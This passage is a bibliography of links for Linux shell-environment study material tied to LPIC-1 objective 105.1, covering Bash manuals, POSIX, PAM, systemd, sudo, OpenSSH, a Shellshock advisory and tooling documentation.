- LPI — Exam 102-500 objectives (Topic 105, *Shells and Shell Scripting*; objective 105.1 *Customize and use the shell environment*): https://www.lpi.org/our-certifications/exam-102-objectives/
- LPI — Exam 101-500 objectives (companion exam of LPIC-1 v5.0): https://www.lpi.org/our-certifications/exam-101-objectives/
- LPI — LPIC-1 Linux Administrator certification overview: https://www.lpi.org/our-certifications/lpic-1-overview/

**Bash**

- GNU Bash Reference Manual — *Bash Startup Files*: https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html
- GNU Bash Reference Manual — *Shell Functions*: https://www.gnu.org/software/bash/manual/html_node/Shell-Functions.html
- GNU Bash Reference Manual — *Aliases*: https://www.gnu.org/software/bash/manual/html_node/Aliases.html
- GNU Bash Reference Manual — *Lists of Commands*: https://www.gnu.org/software/bash/manual/html_node/Lists.html
- GNU Bash Reference Manual — *Bash Variables* (`BASH_ENV`, `PROMPT_COMMAND`, `PS1`–`PS4`, `HISTCONTROL`, `TMOUT`, `FUNCNAME`, `PIPESTATUS`): https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html
- GNU Bash Reference Manual — *Bourne Shell Builtins* (`.`, `export`, `set`, `unset`, `readonly`, `hash`): https://www.gnu.org/software/bash/manual/html_node/Bourne-Shell-Builtins.html
- GNU Bash Reference Manual — *Bash Builtins* (`alias`, `declare`, `local`, `command`, `builtin`, `enable`, `type`, `source`, `shopt`): https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html
- GNU Bash Reference Manual — *The Shopt Builtin*: https://www.gnu.org/software/bash/manual/html_node/The-Shopt-Builtin.html
- GNU Bash Reference Manual — *Bash POSIX Mode*: https://www.gnu.org/software/bash/manual/html_node/Bash-POSIX-Mode.html
- GNU Bash Reference Manual — *Command Search and Execution*: https://www.gnu.org/software/bash/manual/html_node/Command-Search-and-Execution.html
- `bash(1)` manual page: https://man7.org/linux/man-pages/man1/bash.1.html
- GNU Bash home page and release notes: https://www.gnu.org/software/bash/

**POSIX / standards**

- The Open Group Base Specifications — *Shell Command Language*: https://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html
- The Open Group Base Specifications — `sh` utility: https://pubs.opengroup.org/onlinepubs/9699919799/utilities/sh.html
- The Open Group Base Specifications — *Environment Variables* (Chapter 8): https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap08.html
- `environ(7)` manual page: https://man7.org/linux/man-pages/man7/environ.7.html
- `execve(2)` manual page: https://man7.org/linux/man-pages/man2/execve.2.html

**Account provisioning and PAM**

- `useradd(8)` manual page: https://man7.org/linux/man-pages/man8/useradd.8.html
- `login.defs(5)` manual page (`UMASK`, `HOME_MODE`, `CREATE_HOME`): https://man7.org/linux/man-pages/man5/login.defs.5.html
- shadow-utils upstream project: https://github.com/shadow-maint/shadow
- `adduser.conf(5)` (Debian): https://manpages.debian.org/stable/adduser/adduser.conf.5.en.html
- `pam_env(8)` manual page (`/etc/environment`, `/etc/security/pam_env.conf`): https://man7.org/linux/man-pages/man8/pam_env.8.html
- `pam_mkhomedir(8)` manual page: https://man7.org/linux/man-pages/man8/pam_mkhomedir.8.html
- Linux-PAM project documentation: https://github.com/linux-pam/linux-pam
- Red Hat — `authselect(8)` and the `with-mkhomedir` feature: https://man7.org/linux/man-pages/man8/authselect.8.html

**Service and scheduler environments**

- `systemd.exec(5)` — `Environment=`, `EnvironmentFile=`, `PassEnvironment=`: https://www.freedesktop.org/software/systemd/man/latest/systemd.exec.html
- `systemd-system.conf(5)` — `DefaultEnvironment=`: https://www.freedesktop.org/software/systemd/man/latest/systemd-system.conf.html
- `systemd.environment-generator(7)`: https://www.freedesktop.org/software/systemd/man/latest/systemd.environment-generator.html
- `crontab(5)` manual page (environment of a cron job): https://man7.org/linux/man-pages/man5/crontab.5.html

**Privilege boundaries and remote sessions**

- `sudoers(5)` — `env_reset`, `env_keep`, `secure_path`: https://www.sudo.ws/docs/man/sudoers.man/
- `sudo(8)` — `-i` versus `-s`: https://www.sudo.ws/docs/man/sudo.man/
- OpenSSH `sshd_config(5)` — `AcceptEnv`, `PermitUserEnvironment`, `ClientAliveInterval`: https://man.openbsd.org/sshd_config
- OpenSSH `ssh_config(5)` — `SendEnv`, `SetEnv`: https://man.openbsd.org/ssh_config

**Security**

- NVD — CVE-2014-6271 (Shellshock, bash function-import parsing): https://nvd.nist.gov/vuln/detail/CVE-2014-6271
- GNU — official bash 4.3 patch series (patches 025–027 address function import): https://ftp.gnu.org/gnu/bash/bash-4.3-patches/
- Red Hat — Shellshock vulnerability article: https://access.redhat.com/security/cve/CVE-2014-6271

**Tooling used in this material**

- ShellCheck — static analysis for shell scripts: https://www.shellcheck.net/wiki/
- Bats-core — Bash Automated Testing System: https://bats-core.readthedocs.io/en/stable/
- Ansible — `ansible.builtin.copy` / `template` `validate` option: https://docs.ansible.com/ansible/latest/collections/ansible/builtin/template_module.html
- Ansible — `ansible.builtin.user` module: https://docs.ansible.com/ansible/latest/collections/ansible/builtin/user_module.html
- cloud-init — module reference (`users_groups`, `write_files`, `runcmd`): https://cloudinit.readthedocs.io/en/latest/reference/modules.html
- Kubernetes — configure a pod to use a ConfigMap: https://kubernetes.io/docs/tasks/configure-pod-container/configure-pod-configmap/
- Kubernetes — define environment variables for a container: https://kubernetes.io/docs/tasks/inject-data-application/define-environment-variable-container/
- Docker — Dockerfile reference (`ENV`, `ENTRYPOINT`, `CMD`): https://docs.docker.com/reference/dockerfile/
- `strace(1)` manual page: https://man7.org/linux/man-pages/man1/strace.1.html
- freedesktop.org — XDG Base Directory Specification: https://specifications.freedesktop.org/basedir-spec/latest/